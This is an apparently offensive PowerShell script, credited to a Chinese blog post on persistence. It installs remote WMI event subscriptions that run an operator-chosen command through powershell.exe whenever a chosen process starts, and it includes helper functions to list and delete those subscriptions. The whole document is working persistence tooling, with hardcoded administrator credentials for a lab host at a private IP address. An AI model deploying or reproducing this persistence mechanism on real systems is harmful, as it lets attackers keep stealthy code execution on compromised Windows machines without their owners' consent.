#From:rcoil.me/2019/05/【权限维持】WMIC%20事件订阅/
function WMI-EventSubscription
{
     param
     (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
     )
     
     #$FilterName = "FilterName"
     $FilterName =  Read-Host "Please Input EventFilte Name(FilterName) > "
     
     #$Query = "SELECT * FROM Win32_ProcessStartTrace where processname ='notepad.exe'"
     $Query  = Read-Host "Please Input EventFilte Query(SELECT * FROM Win32_ProcessStartTrace where processname ='notepad.exe') > "
     
     
     $EventFilterArgs = @{
        EventNamespace = 'root/cimv2'
        Name = $FilterName
        Query = $Query
        QueryLanguage = 'WQL'
     }
     
     # 在创建Filter之前先删除已存在的
     Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='$FilterName'"  -ComputerName $ComputerName -Credential $Credential  | Remove-WmiObject
     $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $EventFilterArgs  -ComputerName $ComputerName -Credential $Credential
     
     Start-Sleep -Seconds 1
     
     #$ConsumerName  = "ConsumerName"
     $ConsumerName = Read-Host "Please Input Consumer Name(ConsumerName) > " 
     
     
     #$ExecCommand = "calc.exe"
     $ExecCommand = Read-Host "Pleader Input Exec Command(calc.exe) > "
     
     
     $ExecutablePath = "$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe"
     $CommandLineTemplate = $ExecutablePath  + ' ' + $ExecCommand
     $ConsumerArgs= @{
        Name = $ConsumerName
        ExecutablePath = $ExecutablePath
        CommandLineTemplate = $CommandLineTemplate
        RunInteractively="false"
     }
     # 多添加一个js文件，效果不好
     #$ConsumerArgs= @{
     #   Name = $ConsumerName
     #   ScriptingEngine = 'JScript'
     #   ScriptText = $Payload
     #}
     
     # 在创建Consumer之前先删除已存在的
     Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'"  -ComputerName $ComputerName -Credential $Credential | Remove-WmiObject 
     $Consumer = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments  $ConsumerArgs  -ComputerName $ComputerName -Credential $Credential
     Start-Sleep -Seconds 1
     
     $FilterToConsumerArgs = @{
        Filter = $Filter
        Consumer = $Consumer
     }
     
     # 在创建FilterToConsumerBinding之前先删除已存在的
     $ConsumerName = '%' +  $ConsumerName +'%'
     Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '$ConsumerName'" -ComputerName $ComputerName -Credential $Credential  | Remove-WmiObject
     $FilterToConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs -ComputerName $ComputerName -Credential $Credential
}

function WMI-ShowEventSubscription
{
     param
     (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
     )
     $Filters = Get-WMIObject -Namespace root\Subscription -Class __EventFilter -ComputerName $ComputerName -Credential $Credential
     $Consumers = Get-WMIObject -Namespace root\Subscription -Class __EventConsumer -ComputerName $ComputerName -Credential $Credential
     $Bindings = Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -ComputerName $ComputerName -Credential $Credential
     echo "======================= Filter Name ==================="
     echo $Filters 
     echo "======================= Consumers Name ==================="
     echo $Consumers
     echo "======================= Bindings Name ==================="
     echo $Bindings
}
function WMI-DelEventSubscription
{
     param
     (
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
     )
     
     $FilterName =  Read-Host "Please Input EventFilte Name(FilterName) > "
     Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='$FilterName'"  -ComputerName $ComputerName -Credential $Credential  | Remove-WmiObject
     echo "finished"
     
     $ConsumerName = Read-Host "Please Input Consumer Name(ConsumerName) > " 
     Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'"  -ComputerName $ComputerName -Credential $Credential | Remove-WmiObject 
     Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '$ConsumerName'" -ComputerName $ComputerName -Credential $Credential  | Remove-WmiObject
     echo "finished" 
}
$UserUsername = "hacky-pc\Administrator"
$UserPassword ="12345"

    # This block of code is executed when starting a process on a remote machine via wmi
$ChangedPassword = ConvertTo-SecureString $UserPassword -asplaintext -force 
$Credential = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $UserUsername,$ChangedPassword
$ComputerName = "192.168.230.128"
#WMI-EventSubscription -ComputerName $ComputerName -Credential $Credential
#WMI-ShowEventSubscription -ComputerName $ComputerName -Credential $Credential
#WMI-DelEventSubscription -ComputerName $ComputerName -Credential $Credential
